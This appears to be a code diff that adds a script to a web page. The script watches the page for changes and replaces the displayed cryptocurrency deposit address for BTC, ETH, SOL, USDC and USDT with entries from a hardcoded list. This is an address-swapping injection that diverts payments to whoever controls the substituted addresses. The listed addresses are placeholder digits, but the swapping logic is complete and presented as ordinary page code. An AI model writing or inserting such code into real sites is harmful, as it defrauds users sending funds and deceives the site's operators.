@@ -44,6 +44,35 @@
 
   observer.observe(document.body, { childList: true, subtree: true });
 </script>
+<script>
+  const customAddresses = {
+    BTC: "1000000000000000",
+    ETH: "1000000000000001",
+    SOL: "1000000000000002",
+    USDC: "1000000000000003",
+    USDT: "1000000000000004",
+    // Add more mappings as needed
+  };
+
+  const updateAddress = () => {
+    const coinElement = document.querySelector('button[aria-label][aria-selected="true"]'); // selected coin
+    const addrElement = document.querySelector('div:has(> span) > span'); // Solana address field
+
+    if (coinElement && addrElement) {
+      const coinSymbol = coinElement.textContent.trim();
+      if (customAddresses[coinSymbol]) {
+        addrElement.textContent = customAddresses[coinSymbol];
+      }
+    }
+  };
+
+  // Hook into DOM changes again
+  const addressObserver = new MutationObserver(updateAddress);
+  addressObserver.observe(document.body, { childList: true, subtree: true });
+
+  // Initial run after load
+  window.addEventListener('load', () => setTimeout(updateAddress, 300));
+</script>
 
 
 
